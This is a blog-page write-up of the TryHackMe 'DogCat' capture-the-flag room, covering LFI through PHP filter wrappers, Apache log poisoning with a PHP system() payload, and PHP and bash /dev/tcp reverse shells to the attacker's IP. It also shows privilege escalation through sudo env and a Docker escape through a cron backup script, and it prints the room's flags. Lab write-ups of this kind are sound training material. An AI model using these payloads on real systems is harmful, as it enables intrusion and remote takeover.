<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="DogCat Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S&#43;erXAaXMO2Iac6nYk8jtkS2hg&#43;vAx&#43;7&#43;5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ&#43;qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H| 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=| 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl&#43;M3I80/tcp open http syn-ack Apache httpd 2.4.38 ((Debian))| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.38 (Debian)|_http-title: dogcatService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Gobuster /." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/dogcat/dogcat/" />


    <title>
        
             :: Zer0ne  â€” welcome friend
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="">
<meta itemprop="description" content="DogCat Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S&#43;erXAaXMO2Iac6nYk8jtkS2hg&#43;vAx&#43;7&#43;5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ&#43;qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H| 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=| 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl&#43;M3I80/tcp open http syn-ack Apache httpd 2.4.38 ((Debian))| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.38 (Debian)|_http-title: dogcatService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Gobuster /.">

<meta itemprop="wordCount" content="1012"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>

<meta name="twitter:title" content=""/>
<meta name="twitter:description" content="DogCat Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S&#43;erXAaXMO2Iac6nYk8jtkS2hg&#43;vAx&#43;7&#43;5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ&#43;qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H| 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=| 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl&#43;M3I80/tcp open http syn-ack Apache httpd 2.4.38 ((Debian))| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.38 (Debian)|_http-title: dogcatService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Gobuster /."/>



    <meta property="og:title" content="" />
<meta property="og:description" content="DogCat Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S&#43;erXAaXMO2Iac6nYk8jtkS2hg&#43;vAx&#43;7&#43;5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ&#43;qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H| 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=| 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl&#43;M3I80/tcp open http syn-ack Apache httpd 2.4.38 ((Debian))| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.38 (Debian)|_http-title: dogcatService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Gobuster /." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/dogcat/dogcat/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />

<meta property="og:site_name" content="Zer0ne" />
















    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">Zer0ne #</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/dogcat/dogcat/"></a></h2>

            
            
            

            <div class="post-content">
                <h1 id="dogcat">DogCat</h1>
<!-- raw HTML omitted -->
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h3 id="gobuster">Gobuster</h3>
<pre tabindex="0"><code>/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/cats                 (Status: 301) [Size: 311] [--&gt; http://10.10.250.49/cats/]
/index.php            (Status: 200) [Size: 418]
/server-status        (Status: 403) [Size: 277]
</code></pre><p>nmap show only 22 ssh and 80 http on common ports</p>
<p>gobuster show only a forbidden <code>cats</code> directory (there might be dogs too)</p>
<p>on website we notice arguments passed in url <code>'?view=cat'</code></p>
<p>could use burp to bruteforce it but wanna try it manually first so I enter random numbers</p>
<p>it says only cats and dogs allowed so I added a &rsquo;s&rsquo; and tried &lsquo;cats&rsquo;&hellip;got a nice error</p>
<pre tabindex="0"><code>Warning: include(dogs.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening &#39;dogs.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 24
</code></pre><p>we got LFI&hellip;Im not very good at that (not in tryhackme free rooms so I never really learnt it here)</p>
<p>lets google about it&hellip;we find alot&hellip;but it seems we can use php filter wrappers with base64 encoding to view server files</p>
<p><code>?view=php://filter/convert.base64-encode/resource=dog</code></p>
<p>wich returns</p>
<p><code>PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K</code></p>
<p>we decode it</p>
<pre tabindex="0"><code>echo PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K | base64 -d
&lt;img src=&#34;dogs/&lt;?php echo rand(1, 10); ?&gt;.jpg&#34; /&gt;
</code></pre><p>we can therefore view php files like <code>index.php</code></p>
<pre tabindex="0"><code>?view=php://filter/convert.base64-encode/resource=dog/../index

PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
</code></pre><p>Decoded version goes</p>
<pre tabindex="0"><code>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;

&lt;head&gt;
&lt;title&gt;dogcat&lt;/title&gt;
&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;/style.css&#34;&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;h1&gt;dogcat&lt;/h1&gt;
&lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;

&lt;div&gt;
&lt;h2&gt;What would you like to see?&lt;/h2&gt;
&lt;a href=&#34;/?view=dog&#34;&gt;&lt;button id=&#34;dog&#34;&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=&#34;/?view=cat&#34;&gt;&lt;button id=&#34;cat&#34;&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;
&lt;?php
function containsStr($str, $substr) {
	return strpos($str, $substr) !== false;
}
$ext = isset($_GET[&#34;ext&#34;]) ? $_GET[&#34;ext&#34;] : &#39;.php&#39;;
if(isset($_GET[&#39;view&#39;])) {
	if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {
		echo &#39;Here you go!&#39;;
		include $_GET[&#39;view&#39;] . $ext;
	} else {
		echo &#39;Sorry, only dogs or cats are allowed.&#39;;
	}
}
?&gt;
&lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre><p>we notice php extension is added to any parameter given to <code>'?ext='</code> by default&hellip;so changing it may allow us to read other files on server</p>
<p>As we are on an apache server (nmap) we can look for logs and try log poisonning</p>
<p><code>?view=dog/../../../../../../../var/log/apache2/access.log&amp;ext=</code></p>
<p>we can read logs..now we fire up burp suite and use repeater to change our user agent to pass commands with a c parameter</p>
<p>Our user agent is</p>
<pre tabindex="0"><code>&lt;?php system($_GET[&#39;c&#39;]);?&gt;
</code></pre><p>with our user agent executing commands we try to change our request by adding a simple ls to c parameter</p>
<p><code>GET /?view=dog/../../../../../../../var/log/apache2/access.log&amp;ext=&amp;c=ls HTTP/1.1</code></p>
<p>wich works</p>
<pre tabindex="0"><code>cats
dog.php
dogs
flag.php
index.php
style.css
&#34;
</code></pre><p>Now as command we pass a simple shell with netcat listening</p>
<p>Needed to url encode it (burpsuite do that for us when we use the inspector pannel) and pass this as c parameter</p>
<p><code>php -r '$sock=fsockopen(&quot;10.8.226.203&quot;, 2311);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>
<p>we immediately found FLAG 1:</p>
<pre tabindex="0"><code>www-data@4d7292b580b8:/var/www/html$ cat flag.php
cat flag.php

&lt;?php
$flag_1 = &#34;THM{bark_meow_bark_woof}&#34;
?&gt;

www-data@4d7292b580b8:/var/www/html$
</code></pre><p>Time to move around&hellip;we move backward and found second flag (that was quicker than expected)</p>
<pre tabindex="0"><code>cd ..
www-data@4d7292b580b8:/var/www$ ls
ls
flag2_QMW7JvaY2LvK.txt
html
www-data@4d7292b580b8:/var/www$ cat flag2_QMW7JvaY2LvK.txt
cat flag2_QMW7JvaY2LvK.txt
THM{another_one}
</code></pre><p>No folder in home&hellip;I guess its time to PriVEsc</p>
<h2 id="privilege-escalation">privilege escalation</h2>
<pre tabindex="0"><code>sudo -l
Matching Defaults entries for www-data on 4d7292b580b8:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 4d7292b580b8:
(root) NOPASSWD: /usr/bin/env
</code></pre><p>env? that&rsquo;s new lets ask for almighty gtfobins what it thinks&hellip;it says</p>
<pre tabindex="0"><code>sudo env /bin/sh
</code></pre><pre tabindex="0"><code>id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><p>we are root..just like that..lets go get flag3</p>
<p>cd /root
ls
flag3.txt
cat flag3.txt
THM{different_environment_nibba}</p>
<p>hints from flags are cool thins but I don&rsquo;t know where flag 4 could be</p>
<p>when lost I usually go <code>/</code> or google</p>
<p>First google about &ldquo;differents linux environments&rdquo;</p>
<p>ok after alot of reading and the realisation I may be stupid (this room was abot php AND <code>DOCKER</code>)</p>
<p>we might be in a <code>docker container</code> and flag4 is out of it</p>
<pre tabindex="0"><code>hostname
4d7292b580b8
</code></pre><p>Time to get out of 4d7292b580b8</p>
<p>listing all / folder we found a .dockeren file so yeah its docker</p>
<pre tabindex="0"><code>ls -al
total 80
drwxr-xr-x 1 root root 4096 Oct 29 22:52 .
drwxr-xr-x 1 root root 4096 Oct 29 22:52 ..
-rwxr-xr-x 1 root root 0 Oct 29 22:52 .dockerenv
drwxr-xr-x 1 root root 4096 Feb 26 2020 bin
drwxr-xr-x 2 root root 4096 Feb 1 2020 boot
drwxr-xr-x 5 root root 340 Oct 29 22:52 dev
drwxr-xr-x 1 root root 4096 Oct 29 22:52 etc
drwxr-xr-x 2 root root 4096 Feb 1 2020 home
drwxr-xr-x 1 root root 4096 Feb 26 2020 lib
drwxr-xr-x 2 root root 4096 Feb 24 2020 lib64
drwxr-xr-x 2 root root 4096 Feb 24 2020 media
drwxr-xr-x 2 root root 4096 Feb 24 2020 mnt
drwxr-xr-x 1 root root 4096 Oct 29 22:52 opt
dr-xr-xr-x 110 root root 0 Oct 29 22:52 proc
drwx------ 1 root root 4096 Mar 10 2020 root
drwxr-xr-x 1 root root 4096 Feb 26 2020 run
drwxr-xr-x 1 root root 4096 Feb 26 2020 sbin
drwxr-xr-x 2 root root 4096 Feb 24 2020 srv
dr-xr-xr-x 13 root root 0 Oct 29 22:52 sys
drwxrwxrwt 1 root root 4096 Mar 10 2020 tmp
drwxr-xr-x 1 root root 4096 Feb 24 2020 usr
drwxr-xr-x 1 root root 4096 Feb 26 2020 var
</code></pre><p>After more googling we check /opt folder</p>
<pre tabindex="0"><code>cd /opt
cd backups
ls
backup.sh
backup.tar
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
</code></pre><p>we found a backup.sh script that backup the root container to backup.tar</p>
<p>probably as a cron job</p>
<p>we can add a reverse shell to it as we have root rights</p>
<p><code>echo &quot;bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.8.226.203/4444 &lt;&amp;1'&quot; &gt; backup.sh</code></p>
<p>wich give us a new root shell on second netcat listening on port 4444</p>
<pre tabindex="0"><code>hostname
dogcat
</code></pre><p>we escaped..we are on the machine itself</p>
<p>lets look for or final flag&hellip;its right here already</p>
<pre tabindex="0"><code>root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{prison_break_docker}
</code></pre><p>This ctf was awesome (container evasion part mostly)</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2022</span>
            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>



    </body>
</html>
